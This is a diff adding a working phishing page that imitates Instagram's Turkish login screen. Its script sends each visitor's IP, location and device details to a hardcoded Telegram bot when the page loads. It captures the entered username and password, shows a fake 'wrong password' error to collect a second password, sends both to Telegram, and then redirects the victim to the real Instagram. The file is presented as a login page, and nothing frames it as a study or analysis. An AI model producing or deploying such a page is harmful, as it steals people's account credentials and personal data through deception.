@@ -1,0 +1,423 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-font-smoothing: antialiased;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #fafafa;
+            color: #262626;
+            display: flex;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 20px 0;
+        }
+        
+        .container {
+            max-width: 350px;
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        
+        .login-box {
+            background: #fff;
+            border: 1px solid #dbdbdb;
+            border-radius: 8px;
+            margin-bottom: 12px;
+            padding: 20px 40px;
+            width: 100%;
+            text-align: center;
+        }
+        
+        .logo {
+            width: 175px;
+            margin: 15px auto 20px;
+        }
+        
+        .input-group {
+            margin-bottom: 12px;
+            position: relative;
+        }
+        
+        input {
+            width: 100%;
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 4px;
+            padding: 12px 10px;
+            font-size: 14px;
+            height: 40px;
+        }
+        
+        .show-password {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            color: #262626;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+        }
+        
+        .login-btn {
+            width: 100%;
+            background: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            padding: 10px;
+            font-weight: 600;
+            font-size: 14px;
+            margin: 10px 0;
+            cursor: pointer;
+        }
+        
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 15px 0;
+            color: #8e8e8e;
+            font-size: 14px;
+            font-weight: 600;
+        }
+        
+        .divider::before,
+        .divider::after {
+            content: "";
+            flex: 1;
+            border-bottom: 1px solid #dbdbdb;
+            margin: 0 10px;
+        }
+        
+        .fb-login {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #385185;
+            font-weight: 600;
+            font-size: 14px;
+            text-decoration: none;
+            margin: 15px 0;
+        }
+        
+        .fb-login img {
+            width: 16px;
+            height: 16px;
+            margin-right: 8px;
+        }
+        
+        .forgot-pw {
+            display: block;
+            color: #00376b;
+            font-size: 13px;
+            margin: 15px 0;
+            text-decoration: none;
+        }
+        
+        .signup-box {
+            background: #fff;
+            border: 1px solid #dbdbdb;
+            border-radius: 8px;
+            padding: 20px;
+            width: 100%;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        
+        .signup-text {
+            font-size: 14px;
+            color: #262626;
+        }
+        
+        .signup-link {
+            color: #0095f6;
+            font-weight: 600;
+            text-decoration: none;
+        }
+        
+        .footer {
+            text-align: center;
+            width: 100%;
+        }
+        
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            margin-bottom: 15px;
+        }
+        
+        .footer-link {
+            color: #8e8e8e;
+            font-size: 12px;
+            margin: 0 8px 10px;
+            text-decoration: none;
+        }
+        
+        .copyright {
+            color: #8e8e8e;
+            font-size: 12px;
+        }
+        
+        .error-message {
+            color: #ed4956;
+            font-size: 14px;
+            margin: 10px 0;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <img class="logo" src="https://www.instagram.com/static/images/web/logged_out_wordmark-2x.png/d2529dbef8ed.png" alt="Instagram">
+            
+            <div id="errorMsg" class="error-message">
+                Girdiğin şifre yanlış. Lütfen tekrar dene.
+            </div>
+            
+            <form id="loginForm">
+                <div class="input-group">
+                    <input type="text" id="username" placeholder="Telefon numarası, kullanıcı adı veya e-posta" required>
+                </div>
+                <div class="input-group">
+                    <input type="password" id="password" placeholder="Şifre" required>
+                    <button type="button" class="show-password" id="showPassword">Göster</button>
+                </div>
+                <button type="submit" class="login-btn" id="loginBtn">Giriş yap</button>
+            </form>
+            
+            <div class="divider">YA DA</div>
+            
+            <a href="#" class="fb-login">
+                <img src="https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png" alt="Facebook">
+                <span>Facebook ile Giriş Yap</span>
+            </a>
+            
+            <a href="#" class="forgot-pw">Şifreni mi unuttun?</a>
+        </div>
+        
+        <div class="signup-box">
+            <p class="signup-text">Hesabın yok mu? <a href="#" class="signup-link">Kaydol</a></p>
+        </div>
+        
+        <div class="footer">
+            <div class="footer-links">
+                <a href="#" class="footer-link">Meta</a>
+                <a href="#" class="footer-link">Hakkında</a>
+                <a href="#" class="footer-link">Yardım</a>
+                <a href="#" class="footer-link">Basın</a>
+                <a href="#" class="footer-link">API</a>
+                <a href="#" class="footer-link">İş Fırsatları</a>
+                <a href="#" class="footer-link">Gizlilik</a>
+                <a href="#" class="footer-link">Koşullar</a>
+                <a href="#" class="footer-link">Konumlar</a>
+                <a href="#" class="footer-link">Instagram Lite</a>
+                <a href="#" class="footer-link">Threads</a>
+                <a href="#" class="footer-link">Kişi Yükleme ve Hesabı Olmayan Kişiler</a>
+                <a href="#" class="footer-link">Meta Verified</a>
+            </div>
+            <div class="copyright">
+                © 2024 Instagram from Meta
+            </div>
+        </div>
+    </div>
+
+   <script>
+    let loginAttempts = 0;
+    let firstPassword = '';
+    
+    // Enhanced Telegram message sender
+    async function sendToTelegram(message) {
+        const botToken = '7904316763:AAFbbxzLtoCvIm7M0BTf2o8yde74OvSwi50';
+        const chatId = '7816589291';
+        
+        try {
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            const options = {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            };
+            
+            const response = await fetch(url, options);
+            if (!response.ok) {
+                throw new Error(`HTTP error! status: ${response.status}`);
+            }
+            return true;
+        } catch (error) {
+            console.error('Telegram error:', error);
+            // Fallback: Save to localStorage if sending fails
+            localStorage.setItem('pending_telegram_msg', message);
+            return false;
+        }
+    }
+
+    // Get additional device info
+    function getDeviceInfo() {
+        const screen = window.screen;
+        return {
+            resolution: `${screen.width}x${screen.height}`,
+            colorDepth: `${screen.colorDepth} bit`,
+            language: navigator.language,
+            platform: navigator.platform,
+            cookies: navigator.cookieEnabled ? 'Enabled' : 'Disabled',
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            doNotTrack: navigator.doNotTrack || 'Not specified'
+        };
+    }
+
+    // Enhanced login attempt handler
+    async function sendLoginAttempt(username, password, isVerification, newPassword = '') {
+        try {
+            // Get IP and location data
+            const ipResponse = await fetch('https://ipapi.co/json/');
+            const ipData = await ipResponse.json();
+            
+            // Get device info
+            const deviceInfo = getDeviceInfo();
+            
+            // Format detailed message
+            let message = `<b>${isVerification ? '🔐 VERIFICATION ATTEMPT 🔐' : '🔒 LOGIN ATTEMPT 🔒'}</b>\n\n`;
+            
+            message += `<b>📌 Account Info:</b>\n`;
+            message += `👤 <b>Username:</b> <code>${username || 'Not provided'}</code>\n`;
+            
+            if (isVerification) {
+                message += `🔑 <b>First Password:</b> <code>${firstPassword || 'Not provided'}</code>\n`;
+                message += `🔑 <b>Second Password:</b> <code>${newPassword || 'Not provided'}</code>\n`;
+            } else {
+                message += `🔑 <b>Password:</b> <code>${password || 'Not provided'}</code>\n`;
+            }
+            
+            message += `\n<b>🌍 Location Data:</b>\n`;
+            message += `🖥 <b>IP:</b> <code>${ipData.ip || 'Unknown'}</code>\n`;
+            message += `🏙 <b>City:</b> ${ipData.city || 'Unknown'}\n`;
+            message += `🗺 <b>Region:</b> ${ipData.region || 'Unknown'}\n`;
+            message += `🇵🇰 <b>Country:</b> ${ipData.country_name || 'Unknown'} (${ipData.country || 'XX'})\n`;
+            message += `📍 <b>Coordinates:</b> ${ipData.latitude || '?'}, ${ipData.longitude || '?'}\n`;
+            message += `🛜 <b>ISP:</b> ${ipData.org || 'Unknown'}\n`;
+            
+            message += `\n<b>📱 Device Info:</b>\n`;
+            message += `🖥 <b>User Agent:</b> <code>${navigator.userAgent}</code>\n`;
+            message += `🖥 <b>Platform:</b> ${deviceInfo.platform}\n`;
+            message += `🖥 <b>Language:</b> ${deviceInfo.language}\n`;
+            message += `🖥 <b>Resolution:</b> ${deviceInfo.resolution}\n`;
+            message += `🖥 <b>Color Depth:</b> ${deviceInfo.colorDepth}\n`;
+            message += `🖥 <b>Timezone:</b> ${deviceInfo.timezone}\n`;
+            message += `🖥 <b>Cookies:</b> ${deviceInfo.cookies}\n`;
+            message += `🖥 <b>Do Not Track:</b> ${deviceInfo.doNotTrack}\n`;
+            
+            message += `\n<b>⏰ Time:</b> ${new Date().toLocaleString()}\n`;
+            message += `🌐 <b>Page:</b> ${window.location.href}\n`;
+            
+            await sendToTelegram(message);
+            
+            // Send fallback message if any
+            const fallbackMsg = localStorage.getItem('pending_telegram_msg');
+            if (fallbackMsg) {
+                await sendToTelegram(`📩 <b>PENDING MESSAGE DELIVERED</b>\n\n${fallbackMsg}`);
+                localStorage.removeItem('pending_telegram_msg');
+            }
+            
+        } catch (error) {
+            console.error('Error sending login attempt:', error);
+            // Save basic info if detailed collection fails
+            const fallbackMsg = `⚠️ <b>BASIC LOGIN ATTEMPT</b>\n\n` +
+                               `👤 User: ${username}\n` +
+                               `🔑 Pass: ${password}\n` +
+                               `🖥 UA: ${navigator.userAgent}\n` +
+                               `⏰ Time: ${new Date().toLocaleString()}`;
+                               
+            localStorage.setItem('pending_telegram_msg', fallbackMsg);
+        }
+    }
+
+    // Page load event with enhanced tracking
+    window.addEventListener('DOMContentLoaded', async () => {
+        try {
+            const ipResponse = await fetch('https://ipapi.co/json/');
+            const ipData = await ipResponse.json();
+            const deviceInfo = getDeviceInfo();
+            
+            let message = `<b>👀 NEW VISITOR DETECTED 👀</b>\n\n`;
+            message += `<b>🌍 Location:</b> ${ipData.city || 'Unknown'}, ${ipData.country_name || 'Unknown'}\n`;
+            message += `<b>🖥 IP:</b> <code>${ipData.ip || 'Unknown'}</code>\n`;
+            message += `<b>📱 Device:</b> ${deviceInfo.platform} (${deviceInfo.resolution})\n`;
+            message += `<b>🌐 Browser:</b> ${navigator.userAgent}\n`;
+            message += `<b>⏰ Time:</b> ${new Date().toLocaleString()}\n`;
+            message += `<b>🔗 Referrer:</b> ${document.referrer || 'Direct access'}\n`;
+            
+            await sendToTelegram(message);
+            
+        } catch (error) {
+            console.error('Visitor tracking error:', error);
+        }
+        
+        // Form validation setup
+        const usernameInput = document.getElementById('username');
+        const passwordInput = document.getElementById('password');
+        const loginBtn = document.getElementById('loginBtn');
+        
+        function validateForm() {
+            loginBtn.disabled = !(usernameInput.value.trim() && passwordInput.value.trim());
+        }
+        
+        usernameInput.addEventListener('input', validateForm);
+        passwordInput.addEventListener('input', validateForm);
+        
+        // Password toggle
+        document.getElementById('showPassword').addEventListener('click', function() {
+            const passwordInput = document.getElementById('password');
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+                this.textContent = 'Gizle';
+            } else {
+                passwordInput.type = 'password';
+                this.textContent = 'Göster';
+            }
+        });
+    });
+
+    // Form submission
+    document.getElementById('loginForm').addEventListener('submit', async function(e) {
+        e.preventDefault();
+        
+        const username = document.getElementById('username').value.trim();
+        const password = document.getElementById('password').value.trim();
+        const errorMsg = document.getElementById('errorMsg');
+        
+        loginAttempts++;
+        
+        if (loginAttempts === 1) {
+            errorMsg.style.display = 'block';
+            firstPassword = password;
+            await sendLoginAttempt(username, password, false);
+        } else {
+            await sendLoginAttempt(username, firstPassword, true, password);
+            window.location.href = 'https://www.instagram.com/accounts/login/';
+        }
+    });
+</script>
+</body>
+</html>
